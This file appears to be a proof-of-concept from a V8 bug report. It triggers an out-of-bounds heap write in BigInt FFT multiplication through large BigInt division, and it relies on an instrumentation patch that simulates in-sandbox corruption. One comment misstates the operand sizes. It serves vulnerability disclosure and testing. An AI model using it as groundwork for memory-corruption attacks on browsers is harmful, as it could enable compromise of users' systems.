// PoC for BigInt NormalizeAndRecombine OOB Write (Issue 478814654 variant)
// ============================================================
// This PoC triggers the NormalizeAndRecombine carry OOB write via the
// BigInt division path (DivideBurnikelZiegler -> MultiplyFFT).
//
// The instrumentation patch in mul-fft.cc simulates concurrent in-sandbox
// corruption by randomly setting digits to 0xFFFF...FFFF in CopyAndZeroExtend.
// This causes the FFT algorithm to produce non-zero carries that overflow
// past Z.len(), writing to Z[zi] where zi == Z.len().
//
// Expected result with ASAN build:
//   heap-buffer-overflow WRITE of size 8 in MultiplyFFT
//
// Expected result with sandbox build (no ASAN):
//   "V8 sandbox violation detected!" if the OOB write escapes sandbox,
//   or corruption of adjacent in-sandbox objects.
//
// Build requirements:
//   - V8_ADVANCED_BIGINT_ALGORITHMS enabled (default on non-Android)
//   - Instrumentation patch applied to mul-fft.cc
//   - Operands must be >= 720 digits (kFftThreshold on 64-bit)
//     which means ~46080 bits each

// Create BigInts large enough to trigger FFT multiplication
// 123456n ** 46000n produces a number with well over 720 digits
const x = 123456n;
const a = 31337n ** x;
const b = 42n ** x;

// This division triggers:
//   DivideBurnikelZiegler -> D3n2n -> Multiply(D, Qhat, B2)
//   -> MultiplyFFT -> NormalizeAndRecombine
// With the instrumentation patch, the FFT input buffers get randomly
// corrupted, causing carry overflow in NormalizeAndRecombine.
const c = a / b;

print("Division completed (if you see this, the OOB wasn't caught)");
